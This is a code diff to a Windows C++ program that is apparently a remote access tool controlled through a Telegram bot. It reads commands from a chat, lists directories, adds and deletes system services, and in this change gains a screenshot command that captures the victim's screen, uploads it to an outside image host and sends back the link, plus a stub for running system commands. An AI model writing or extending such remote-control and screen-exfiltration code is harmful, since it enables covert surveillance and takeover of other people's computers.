@@ -25,10 +25,13 @@ SOFTWARE.
 #include "common.h"
 #include "Manager.h"
 #include "Telegram.h"
+#include "PrntSc.h"
 
 #include "ProcessManager.h"
 #include "FileManager.h"
 #include "ServiceManager.h"
+
+#include "ScreenTool.h"
 
 #include "Information.h"
 
@@ -124,6 +127,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 			Sleep(atoi(s.client_delay));
 
 			last = api.GetLastMessageText(atoi(s.chatid));
+
 			if (last.substr(0, prefix.size()) == prefix) {
 				std::string command = last.replace(last.find(prefix), prefix.size(), "");
 				params = split(command, ' ');
@@ -208,8 +212,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					}
 
 					// if only dir
-					else {
-						std::string objects = DirectoryObjectsList(params[1]);
+					else if (params[1] == "show") {
+						std::string objects = DirectoryObjectsList(params[2]);
 						if (objects != "") {
 							api.SendTextMessage(s.chatid, objects.c_str());
 						}
@@ -238,11 +242,16 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 						DWORD Type = ParseTypeDriver(params[5]);
 						DWORD StartType = ParseStartTypeDriver(params[6]);
 
-						if (AddService(params[2], params[3], params[4], Type, StartType)) {
-							api.SendTextMessage(s.chatid, "Success! Service has been added");
+						if (Type == 0 || StartType == 0) {
+							api.SendTextMessage(s.chatid, "Error! Service not added");
 						}
 						else {
-							api.SendTextMessage(s.chatid, "Error! Service not added");
+							if (AddService(params[2], params[3], params[4], Type, StartType)) {
+								api.SendTextMessage(s.chatid, "Success! Service has been added");
+							}
+							else {
+								api.SendTextMessage(s.chatid, "Error! Service not added");
+							}
 						}
 					}
 
@@ -255,6 +264,34 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 						else {
 							api.SendTextMessage(s.chatid, "Error! Service not deleted");
 						}
+					}
+				}
+
+				// SYSTEM
+				else if (params[0] == "system") {
+					// Deleted  Delete --- this cmd ---
+					// user[ID] system ping google.com
+					try {
+						std::string cmd = command.replace(command.find("system "), 7, "");
+
+					}
+					catch (std::exception) {
+						api.SendTextMessage(s.chatid, "Error! Recheck the parameters");
+					}
+				}
+
+				// SCREENSHOT
+				else if (params[0] == "screenshot") {
+					std::string filename = std::to_string(rand()) + ".jpeg";
+
+					if (GDIScreen(filename)) {
+						std::string url = UploadImage("B4DB4B3", filename.c_str());
+						api.SendTextMessage(s.chatid, url.c_str());
+
+						DeleteFileA(filename.c_str());
+					}
+					else {
+						api.SendTextMessage(s.chatid, "Error! Screenshot was not created");
 					}
 				}
 			}
